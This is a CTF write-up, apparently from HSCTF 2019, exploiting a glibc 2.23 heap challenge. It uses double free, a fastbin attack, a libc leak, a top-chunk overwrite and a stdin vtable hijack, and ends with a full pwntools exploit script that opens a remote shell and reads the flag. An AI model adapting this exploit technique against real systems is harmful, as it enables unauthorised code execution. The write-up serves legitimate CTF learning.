[Pwn - 480] Aria Writer v3 (16 solves)
======



[binary](https://sturmisch.github.io/assets/2019/hsctf/hardheap/hard-heap) and [libc](https://sturmisch.github.io/assets/2019/hsctf/ariav3/libc-2.23.so) file



Credit to [this writeup](https://amritabi0s.wordpress.com/2018/04/02/0ctf-quals-babyheap-writeup/) because without it I can't figure out the general steps to approach the solution. Please note that I'm going to omit gdb and pseudocode outputs for sake of brevity.



### Analysis

We're given a binary and a libc file:
```
tempest@tempestuous:~/CTF/2019/hsctf/pwn/hardheap$ file hard-heap; checksec hard-heap
hard-heap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=953a4ace5618e504e557b188ec7ed3de8495bb98, stripped
[*] '/home/tempest/CTF/2019/hsctf/pwn/hardheap/hard-heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```



Looks like we're in for a bit of trouble.
```
tempest@tempestuous:~/CTF/2019/hsctf/pwn/hardheap$ ./hard-heap 
Welcome to Hard Heap!
1. Sice a deet
2. Observe a deet
3. Antisice a deet
4. Exit
> 
```
Looks like we can allocate, view, and delete chunks. Pseudocode of allocate function:
```C
if(n_ptr > 19) abort();
...
scanf("%u",&size); getchar();
if(size > 0x48) abort();
ptrs[n_ptr] = malloc(size);
char *ptr = ptrs[n_ptr];
ptr[read(0,ptrs[n_ptr],size)-1] = 0;
++n_ptr;
...
```
We can't allocate smallbin as size is limited to 0x48, and the allocation is limited to 19 chunks.



The `view` function is straightforward, as it uses `puts(ptrs[n_ptr])`. Pseudocode of `delete` function:
```C
...
scanf("%u",&idx); getchar();
if(idx > 19) abort();
free(ptrs[idx]);
...
```
The vulnerability here is UAF and double free, since chunk's content is not zero-ed before freeing, and pointer array is not zero-ed. Note that we can free as many chunk as we want. We're going to use [fastbin attack](https://github.com/shellphish/how2heap/blob/master/glibc_2.25/fastbin_dup_into_stack.c) with a bit of luck to gain RCE.



### Exploitation

First we need to leak heap and libc pointers. We allocate exactly 7 chunks and we're going to fiddle with 5 of them, mainly 2nd-6th . We fake a 0x20 size chunk in fastbin, we need this for 2 steps below:
```
gef> tel 0x0000563b4f62f000 
0x0000563b4f62f000|+0x0000: 0x0000000000000000
0x0000563b4f62f008|+0x0008: 0x0000000000000031 -> first chunk
0x0000563b4f62f010|+0x0010: "aaaaaaaa"
0x0000563b4f62f018|+0x0018: 0x0000000000000000
0x0000563b4f62f020|+0x0020: 0x0000000000000000
0x0000563b4f62f028|+0x0028: 0x0000000000000031 -> fake size 
0x0000563b4f62f030|+0x0030: 0x0000000000000000
0x0000563b4f62f038|+0x0038: 0x0000000000020fd1
```



Then we put fake prev size in 4th chunk (so that 5th chunk has prev size property) for later use:
```
gef> tel 0x0000563b4f62f090     
0x0000563b4f62f090|+0x0000: 0x0000000000000000
0x0000563b4f62f098|+0x0008: 0x0000000000000031 
0x0000563b4f62f0a0|+0x0010: "dddddddd" -> 4th chunk
0x0000563b4f62f0a8|+0x0018: 0x0000000000000000
0x0000563b4f62f0b0|+0x0020: 0x0000000000000000
0x0000563b4f62f0b8|+0x0028: 0x0000000000000000
0x0000563b4f62f0c0|+0x0030: 0x0000000000000090 -> fake prev size
0x0000563b4f62f0c8|+0x0038: 0x0000000000000051
0x0000563b4f62f0d0|+0x0040: "ffffffff" -> 5th chunk
```



Time to launch our attack. We double free two 0x20 chunks we've allocated, and leak heap pointer from there. A fastbin attack to change chunk size to a smallbin is done after (we need the heap leak for this), and this is where the fake size and prev size comes in.
```
gef> tel 0x0000563b4f62f000 50
0x0000563b4f62f000|+0x0000: 0x0000000000000000
0x0000563b4f62f008|+0x0008: 0x0000000000000031
0x0000563b4f62f010|+0x0010: "aaaaaaaa" -> 1st chunk
0x0000563b4f62f018|+0x0018: 0x0000000000000000
0x0000563b4f62f020|+0x0020: 0x0000000000000000
0x0000563b4f62f028|+0x0028: 0x0000000000000031 -> fake size
0x0000563b4f62f030|+0x0030: 0x0000000000000000  <-$rax, $rdx
0x0000563b4f62f038|+0x0038: 0x0000000000000091 -> overwritten size
0x0000563b4f62f040|+0x0040: 0x0062626262626262 -> 2nd chunk
...
0x0000563b4f62f0c0|+0x00c0: 0x0000000000000090 -> fake prev size
```



Then we free the chunk with overwritten size field, main arena ptr will be populated in our chunk:
```
gef> tel 0x0000563b4f62f040
0x0000563b4f62f040|+0x0000: 0x00007f883fa2db78 -> 0x0000563b4f62f1b0 -> 0x0000000000000000
0x0000563b4f62f048|+0x0008: 0x00007f883fa2db78 -> 0x0000563b4f62f1b0 -> 0x0000000000000000
```



Now we can aim for RCE, although it's not that simple since we can't allocate near `__malloc_hook` (will be explained later). Recall that `top` chunk is a special chunk which services every `malloc` request.
```
gef> p main_arena.top
$3 = (mchunkptr) 0x563b4f62f1b0
gef> p &main_arena.top
$4 = (mchunkptr *) 0x7f883fa2db78 <main_arena+88>
```
If we manage to control `top` chunk, we can control where our heap chunk is going to be allocated. But how can we land a chunk near `top` ? We can with `fastbin attack` and a bit of luck. For example in [this writeup](https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html), it's stated that we can make use of address misalignment in order to allocate chunk. Let me demonstrate; First we see that the `main_arena` has no chunk size of 0x10-0x40 near `top` ptr.
```
gef> tel 0x7f883fa2db20-0x40 20
0x00007f883fa2dae0|+0x0000: 0x0000000000000000
0x00007f883fa2dae8|+0x0008: 0x0000000000000000
0x00007f883fa2daf0|+0x0010: 0x00007f883fa2c260 -> dunno what this is
0x00007f883fa2daf8|+0x0018: 0x0000000000000000
0x00007f883fa2db00|+0x0020: 0x00007f883f6eee20 -> <memalign_hook_ini+0> push r12
0x00007f883fa2db08|+0x0028: 0x00007f883f6eea00 -> <realloc_hook_ini+0> push r15
0x00007f883fa2db10|+0x0030: 0x0000000000000000
0x00007f883fa2db18|+0x0038: 0x0000000000000000
0x00007f883fa2db20|+0x0040: 0x0000000000000000
0x00007f883fa2db28|+0x0048: 0x0000000000000000
0x00007f883fa2db30|+0x0050: 0x0000000000000000
0x00007f883fa2db38|+0x0058: 0x0000000000000000
0x00007f883fa2db40|+0x0060: 0x0000000000000000
0x00007f883fa2db48|+0x0068: 0x0000000000000000
0x00007f883fa2db50|+0x0070: 0x0000000000000000
0x00007f883fa2db58|+0x0078: 0x0000000000000000
0x00007f883fa2db60|+0x0080: 0x0000000000000000
0x00007f883fa2db68|+0x0088: 0x0000000000000000
0x00007f883fa2db70|+0x0090: 0x0000000000000000
0x00007f883fa2db78|+0x0098: 0x0000563b4f62f1b0 -> top
```



Because of size limitation on chunk allocation (size <= 0x48), we can't use 0x60 chunk in order to land chunk near `0x00007f883fa2daf0`. Let's free 2 fastbin chunks and see what happens:
```
gef> tel &main_arena 12
0x00007f883fa2db20|+0x0000: 0x0000000000000000
0x00007f883fa2db28|+0x0008: 0x0000000000000000
0x00007f883fa2db30|+0x0010: 0x0000563b4f62f090 -> freed 0x20 chunk
0x00007f883fa2db38|+0x0018: 0x0000000000000000
0x00007f883fa2db40|+0x0020: 0x0000563b4f62f0c0 -> freed 0x40 chunk
0x00007f883fa2db48|+0x0028: 0x0000000000000000
0x00007f883fa2db50|+0x0030: 0x0000000000000000
0x00007f883fa2db58|+0x0038: 0x0000000000000000
0x00007f883fa2db60|+0x0040: 0x0000000000000000
0x00007f883fa2db68|+0x0048: 0x0000000000000000
0x00007f883fa2db70|+0x0050: 0x0000000000000000
0x00007f883fa2db78|+0x0058: 0x0000563b4f62f1b0 -> top

gef> heap bins fast
---- Fastbins for arena 0x7f883fa2db20 ----
Fastbins[idx=0, size=0x10] 0x00
Fastbins[idx=1, size=0x20] <- Chunk(addr=0x563b4f62f0a0, size=0x30, flags=PREV_INUSE) <- Chunk(addr=0x563b4f62f070, size=0x30, flags=PREV_INUSE) 
Fastbins[idx=2, size=0x30] 0x00
Fastbins[idx=3, size=0x40] <- Chunk(addr=0x563b4f62f0d0, size=0x50, flags=) 
Fastbins[idx=4, size=0x50] 0x00
Fastbins[idx=5, size=0x60] 0x00
Fastbins[idx=6, size=0x70] 0x00

gef> tel 0x00007f883fa2db2d 6
0x00007f883fa2db2d|+0x0000: 0x3b4f62f090000000
0x00007f883fa2db35|+0x0008: 0x0000000000000056
0x00007f883fa2db3d|+0x0010: 0x3b4f62f0c0000000 -> target
0x00007f883fa2db45|+0x0018: 0x0000000000000056
0x00007f883fa2db4d|+0x0020: 0x0000000000000000
0x00007f883fa2db55|+0x0028: 0x0000000000000000


gef> heap chunk 0x00007f883fa2db3d
Chunk(addr=0x7f883fa2db3d, size=0x50, flags=IS_MMAPPED|NON_MAIN_ARENA)
Chunk size: 80 (0x50)
Usable size: 64 (0x40)
Previous chunk size: 4273743356745482240 (0x3b4f62f090000000)
PREV_INUSE flag: Off
IS_MMAPPED flag: On
NON_MAIN_ARENA flag: On
```



Now we can see a light out of this. We can't use 0x40 size chunk because we're going to put `main_arena` address to freed list, and `malloc` will yell at us since `0x30 != 0x60`. Also, this is where our luck comes in. Without ASLR, we can see that the chunk size is 0x15, and exploit **will** fail; in fact, the exploit only works if the first byte of heap address is 0x56. If it's 0x55, program will crash somewhere in `malloc`, probably due to `PREV_IN_USE` bit set (honestly I don't know why either). After four allocations, our chunk will land near `top` ptr:
```
gef> p $rax
$5 = 0x7f883fa2db3d -> return value from malloc
gef> tel $rax+3
0x00007f883fa2db40|+0x0000: 0x883fa2db2d000000
0x00007f883fa2db48|+0x0008: 0x0000000000000000
0x00007f883fa2db50|+0x0010: 0x0000000000000000
0x00007f883fa2db58|+0x0018: 0x0000000000000000
0x00007f883fa2db60|+0x0020: 0x0000000000000000
0x00007f883fa2db68|+0x0028: 0x0000000000000000
0x00007f883fa2db70|+0x0030: 0x0000000000000000
0x00007f883fa2db78|+0x0038: 0x0000563b4f62f1b0 -> top
```



Now, we've already overwritten `top` ptr, and `malloc` will return our desired address at next 16 bytes. **Before that**, remember that we still have a freed smallbin with size of 0x80 in unsorted bin (which acts as last remainder chunk).
```
gef> heap bins unsorted
---- Unsorted Bin for arena 'main_arena' ----
[+] unsorted_bins[0]: fw=0x563b4f62f030, bk=0x563b4f62f030
->  Chunk(addr=0x563b4f62f040, size=0x90, flags=PREV_INUSE)
[+] Found 1 chunks in unsorted bin.
```
Allocate a 0x40 size chunk, and next 0x40 chunk allocation will return our desired address from `top` (since last remainder chunk can't serve our request). Next and final part is quite frustrating, since I can hardly find any suitable place to land a chunk with. In the end, I chose to allocate a chunk near `_IO_2_1_stdin_`'s vtable, and overwrite it with heap ptr (also filling heap chunks with `one_gadget`s), next `scanf` will call \_\_GI\_\_\_uflow, which wii call \[vtable+0x28\], calling `one_gadget`.
```
gef> tel $6
0x00007f883fa2d988|+0x0000: 0x0000000000000000 -> allocated chunk
0x00007f883fa2d990|+0x0008: 0x0000000000000000
0x00007f883fa2d998|+0x0010: 0x0000000000000000
0x00007f883fa2d9a0|+0x0018: 0x00000000ffffffff
0x00007f883fa2d9a8|+0x0020: 0x0000000000000000
0x00007f883fa2d9b0|+0x0028: 0x0000000000000000
0x00007f883fa2d9b8|+0x0030: 0x0000563b4f62f0d0 -> vtable

gef> tel 0x0000563b4f62f0c0 24
0x0000563b4f62f0c0|+0x0000: 0x0000000000000040 ("@"?)
0x0000563b4f62f0c8|+0x0008: 0x0000000000000050 ("P"?)
0x0000563b4f62f0d0|+0x0010: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
0x0000563b4f62f0d8|+0x0018: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
0x0000563b4f62f0e0|+0x0020: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
0x0000563b4f62f0e8|+0x0028: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
0x0000563b4f62f0f0|+0x0030: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
...

gef> bt
#0  __GI___uflow
#1  0x00007f883f6c5260 in _IO_vfscanf_internal
#2  0x00007f883f6d45df in __isoc99_scanf
...
gef> x/2i $rip      
=> 0x7f883f6e43f3 <__GI___uflow+83>:    mov    rax,QWORD PTR [rax+0x28]
   0x7f883f6e43f7 <__GI___uflow+87>:    jmp    rax
gef> tel $rax+0x28 1
0x0000563b4f62f0f8|+0x0000: 0x00007f883f75a147 -> <exec_comm+2263> mov rax, QWORD PTR [rip+0x2d2d6a]
```



Full exploit code:
```Python
#!/usr/bin/python

from pwn import *
from time import sleep

def allocate(size,payload):
	r.sendlineafter("> ",'1')
	r.sendlineafter("> ","{:d}".format(size))
	r.sendafter("> ",payload)

def view(idx):
	r.sendlineafter("> ",'2')
	r.sendlineafter("> ","{:d}".format(idx))
	return r.recvline(False)

def free(idx):
	r.sendlineafter("> ",'3')
	r.sendlineafter("> ","{:d}".format(idx))

def exploit():
	log.info("faking 0x20 size")
	payload = 'a'*8
	payload += p64(0)*2
	payload += p64(0x31)
	allocate(0x28,payload) # 0

	allocate(0x28,'b'*8) # 1
	allocate(0x28,'c'*8) # 2
	
	log.info("faking 0x90 prev size")
	payload = 'd'*8
	payload += p64(0)*3
	payload += p64(0x90)
	allocate(0x28,payload) # 3

	allocate(0x48,'f'*8) # 4
	allocate(0x48,'g'*8) # 5
	allocate(0x48,'h'*8) # 6 -> border

	log.info("triggering double free")
	free(2)
	free(3)
	free(2)

	heap_base = u64(view(2).ljust(8,'\x00')) - 0x90
	log.info("heap base: {}".format(hex(heap_base)))
	try:
		assert ((heap_base >> (5*8)) & 0xff) == 0x56
	except AssertionError:
		log.warning("heap address's 3rd byte is not 0x56, exploit will fail")
		r.close()
		sys.exit(-1)
	
	log.info("placing {} as target".format(hex(heap_base+0x30)))
	allocate(0x28,p64(heap_base+0x30-0x10)) # 7 -> 2
	allocate(0x28,'k'*8) # 8 -> 3
	allocate(0x28,'l'*8) # 9 -> 2

	log.info("overwriting chunk's size (0x20 -> 0x80)")
	payload = p64(0)
	payload += p64(0x91)
	allocate(0x28,payload) # 10

	log.info("freeing 0x80 chunk to populate chunk with main arena ptr")
	free(1)

	libc_leak = u64(view(1).ljust(8,'\x00'))
	libc.address = libc_leak-0x3c4b78
	main_arena = libc_leak-0x58
	one_gadget = libc.address + 0xf1147 # [rsp+0x70] == 0
	stdin = libc.symbols["_IO_2_1_stdin_"]
	log.info("libc leak: {}".format(hex(libc_leak)))
	log.info("libc base: {}".format(hex(libc.address)))
	log.info("_IO_2_1_stdin_->vtable: {}".format(hex(stdin+0xd8)))
	log.info("one gadget: {}".format(hex(one_gadget)))

	log.info("populating fastbinsY[2] by freeing 0x20 chunk")
	free(2)
	free(3)

	log.info("triggering double free on 0x40 chunk")
	free(4)
	free(5)
	free(4)
	
	log.info("placing {} as target chunk with 0x56 size".format(hex(main_arena+0x1d)))
	allocate(0x48,p64(main_arena+0x1d-0x10)) # 11 -> 4

	log.info("filling chunk content with one_gadgets")
	allocate(0x48,p64(one_gadget)*8+p64(one_gadget)[:7]) # 12 -> 5
	allocate(0x48,p64(one_gadget)*8+p64(one_gadget)[:7]) # 13 -> 4

	log.info("overwriting top ptr with target chunk")
	payload = '\x00'*3
	payload += p64(0)*7
	payload += p64(stdin+0xd8-0x40)
	allocate(0x48,payload) # 14 -> near top

	log.info("subtracting last remainder to 0x30")
	allocate(0x48,'o'*8) # 15

	log.info("overwriting vtable with heap chunk")
	payload = p64(0)*3
	payload += p64(0xffffffff)
	payload += p64(0)*2
	payload += p64(heap_base+0xd0)[:7]
	allocate(0x48,payload) # 16
	sleep(2)

	log.warning("triggering shell via vtable jump")
	r.interactive()

context.terminal = ["tmux","new-window","-c","/tmp"]
# context.log_level = "debug"
context.timeout = 1 # somewhat needed
exe = ELF("./hard-heap")
libc = exe.libc

if len(sys.argv) < 2:
	r = process(exe.path)
	gdb.attach(r,"""
		# pie b *0xb79
		# pie b *0xcbb
		# pie b *0xd6a
		b *execve
		#dir ~/glibc-2.23/malloc/malloc.c
		c
	""")
else:
	r = remote("pwn.hsctf.com",5555)

exploit()
```



Output:
```
vagrant@ubuntu-xenial:~/sandbox/2019/hsctf/hardheap$ python exploit.py go
[*] '/home/vagrant/sandbox/2019/hsctf/hardheap/hard-heap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn.hsctf.com on port 5555: Done
[*] faking 0x20 size
[*] faking 0x90 prev size
[*] triggering double free
[*] heap base: 0x5649edcc5000
[*] placing 0x5649edcc5030 as target
[*] overwriting chunk's size (0x20 -> 0x80)
[*] freeing 0x80 chunk to populate chunk with main_arena's ptr
[*] libc leak: 0x7f69f47e4b78
[*] libc base: 0x7f69f4420000
[*] _IO_2_1_stdin_->vtable: 0x7f69f47e49b8
[*] one gadget: 0x7f69f4511147
[*] populating fastbinsY[2] by freeing 0x20 chunk
[*] triggering double free on 0x40 chunk
[*] placing 0x7f69f47e4b3d as target chunk with 0x56 size
[*] filling chunk content with one gadgets
[*] overwriting top ptr with target chunk
[*] subtracting last remainder to 0x30
[*] overwriting vtable with heap chunk
[!] triggering shell via vtable jump
[*] Switching to interactive mode
Done!
Welcome to Hard Heap!
1. Sice a deet
2. Observe a deet
3. Antisice a deet
4. Exit
> $ ls
bin
dev
flag
hard-heap
lib
lib32
lib64
libc.so.6
libc.so.6.zip
$ cat flag
hsctf{you_sice_deets_so_well_you_must_be_suchet}$ 
$ 
[*] Closed connection to pwn.hsctf.com port 5555
vagrant@ubuntu-xenial:~/sandbox/2019/hsctf/hardhe
```